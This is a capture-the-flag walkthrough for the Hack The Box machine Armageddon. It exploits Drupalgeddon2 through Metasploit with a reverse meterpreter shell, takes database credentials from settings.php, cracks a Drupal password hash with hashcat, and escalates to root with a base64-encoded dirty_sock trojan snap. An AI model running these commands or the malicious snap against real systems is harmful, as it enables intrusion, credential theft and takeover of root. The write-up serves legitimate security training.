---
title:     "Hack The Box - Armageddon"
tags: [drupal, php, mysql, database, hashcat, snap]
categories: HackTheBox
---
[![info_card](/img/armageddon/info_card.png)](/img/armageddon/info_card.png)

Armageddon is an easy rated machine on HackTheBox created by [bertolis](https://www.hackthebox.eu/home/users/profile/27897). For the user part we will abuse CVE-2018-7600 aka Drupalgeddon2. After gaining a foothold we will find the database credentials from drupal's `settings.php` file. Cracking the hash in the database we can ssh in as the user brucetherealadmin. Bruce is allowed to install any snap package with root permissions, which gives us an easy root modifying the `dirty_socks` exploit.

# User
## Nmap

As usual we start our enumeration of with a nmap scan against all ports, followed by a script and version detection scan against the open ones to get a full picture of the attack surface.

`All ports`
```
$ sudo nmap -p- -T4 10.129.48.89
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-21 17:41 BST
Nmap scan report for 10.129.48.89
Host is up (0.035s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 103.99 seconds
```

`Script and version`
```
$ sudo nmap -p22,80 -sC -sV 10.129.48.89
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-21 17:44 BST
Nmap scan report for 10.129.48.89
Host is up (0.028s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.10 seconds\
```

## Drupalgeddon

There are only two ports open on the target with http being a significantly larger attack surface than ssh, hence we will start there. Browsing to it in our browser we see a login interface where the source reveals it is running drupal 7.

[![home](/img/armageddon/home.png)](/img/armageddon/home.png)

[![drupal](/img/armageddon/drupal.png)](/img/armageddon/drupal.png)

This version of drupal is vulnerable to CVE-2018-7600 also called drupalgeddon2. There exists a msf module for this CVE which we will use out of simplicity. We set the port to one that is mostly allowed for outbound connections, set the lhost to our vpn ip, set the rhost to the target and run the exploit. After some time it returns in a meterpreter on the target. 

```
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set lport 443
lport => 443
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > use exploit/unix/webapp/drupal_drupalgeddon2
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set lport 443
lport => 443
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set lhost 10.10.14.68
lhost => 10.10.14.68
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set rhost 10.129.48.89
rhost => 10.129.48.89
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Started reverse TCP handler on 10.10.14.68:443 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable.
[*] Sending stage (39282 bytes) to 10.129.48.89
[*] Meterpreter session 1 opened (10.10.14.68:443 -> 10.129.48.89:39072) at 2021-07-21 17:47:04 +0100

meterpreter >
```

## Database credentials

Drupal often stores the database credentials in a `settings.php` file which is also the case here.

```
meterpreter > shell
Process 2108 created.
Channel 0 created.
cat /var/www/html/sites/default/settings.php
<?php

/**
 * @file
 * Drupal site-specific configuration file.
...[snip]...
$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
...[snip]...
```

Since we can neither use python nor script, getting a real shell is hard. So we use the `-e` in mysql to get information from the database.  Looking through the database as drupaluser we find the hashed password for brucetherealadmin using the drupal database in the users table.

```
mysql -u"drupaluser" -p"CQHEy@9M*m23gBVj" -e "show databases;"
Database
information_schema
drupal
mysql
performance_schema
```

```
mysql -u"drupaluser" -p"CQHEy@9M*m23gBVj" -e "use drupal;show tables;"    
Tables_in_drupal
actions
authmap
batch
block
block_custom
block_node_type
...[snip]...
taxonomy_vocabulary
url_alias
users
users_roles
variable
watchdog
```

```
mysql -u"drupaluser" -p"CQHEy@9M*m23gBVj" -e "use drupal;select * from users;"
uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone        language        picture init    data
0                                               NULL    0       0       0       0       NULL            0               NULL
1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu                     filtered_html   1606998756      1607077194      1607076276      1       Europe/London           0       admi
n@armageddon.eu a:1:{s:7:"overlay";i:1;}

```

Hashcat cracks the hash quite quickly.

```
$ hashcat -m 7900 -O hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.1.1) starting...
...[snip]...
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Drupal7
Hash.Target......: $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
Time.Started.....: Wed Jul 21 17:57:06 2021 (1 sec)
Time.Estimated...: Wed Jul 21 17:57:07 2021 (0 secs)
Guess.Base.......: File (/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      450 H/s (8.75ms) @ Accel:64 Loops:512 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 256/14344384 (0.00%)
Rejected.........: 0/256 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:32256-32768
Candidates.#1....: 123456 -> freedom

Started: Wed Jul 21 17:56:59 2021
Stopped: Wed Jul 21 17:57:08 2021
```

After logging in as brucetherealadmin via SSH we can now grab the user flag.

```
$ ssh brucetherealadmin@10.129.48.89
The authenticity of host '10.129.48.89 (10.129.48.89)' can't be established.
ECDSA key fingerprint is SHA256:bC1R/FE5sI72ndY92lFyZQt4g1VJoSNKOeAkuuRr4Ao.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.48.89' (ECDSA) to the list of known hosts.
brucetherealadmin@10.129.48.89's password: 
Last login: Tue Mar 23 12:40:36 2021 from 10.10.14.2
[brucetherealadmin@armageddon ~]$ wc -c user.txt 
33 user.txt
```

# Root
## Snap

Checking for sudo permission we see that we can run snap install on any snap package as root.

```
[brucetherealadmin@armageddon ~]$ sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

Probably the easiest way to abuse this is by using the [dirty_sockv2](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py) exploit since it works by installing a malicious snap package aswell. For this we grab the base64 snap package from the source and decode it do our snap package.

```py
TROJAN_SNAP = ('''
aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''
+ 'A' * 4256 + '==')

print(TROJAN_SNAP)
```

```
$ python gensnap.py | base64 -d > evil.snap
```

Now we just have to transfer it to the target...

```
$ scp evil.snap brucetherealadmin@10.129.48.89:/dev/shm/evil.snap 
brucetherealadmin@10.129.48.89's password: 
evil.snap											100% 4096    70.8KB/s   00:00
```

... and install it with root permissions.

```
[brucetherealadmin@armageddon shm]$ sudo /usr/bin/snap install --devmode evil.snap 
dirty-sock 0.1 installed
```

This adds a user dirty_sock with the password dirty_sock to the machine which is allowed to run any command with sudo.

```
[brucetherealadmin@armageddon shm]$ su dirty_sock
Password:
[dirty_sock@armageddon shm]$ sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for dirty_sock:
[root@armageddon shm]#
```

After switching to the user and escalating to root with sudo su we can add the rootflag to our collection.

```
[root@armageddon shm]# wc -c /root/root.txt
33 /root/root.txt
```
